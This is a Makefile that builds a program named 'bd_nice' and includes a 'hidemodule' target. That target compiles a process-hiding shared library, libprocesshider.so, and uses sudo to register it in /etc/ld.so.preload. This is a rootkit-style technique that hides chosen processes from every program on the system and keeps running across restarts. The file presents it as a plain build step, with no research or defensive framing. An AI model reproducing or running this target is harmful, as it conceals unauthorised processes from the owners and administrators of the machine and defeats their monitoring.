SOURCES += src/main.c src/msbuffer.c
OUTPUT = bin/bd_nice
CFLAGS += -lpthread -fopenmp -ggdb -lm -O3


all: $(SOURCES)
	cc $(SOURCES) $(CFLAGS) -o $(OUTPUT)
	

hidemodule:
	gcc -Wall -fPIC -shared -o bin/libprocesshider.so src/lib/libprocesshider.c -ldl
	cp bin/libprocesshider.so /usr/local/lib/
	sudo touch /etc/ld.so.preload
	sudo bash -c "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"


clean: 
	rm -rf bin/*
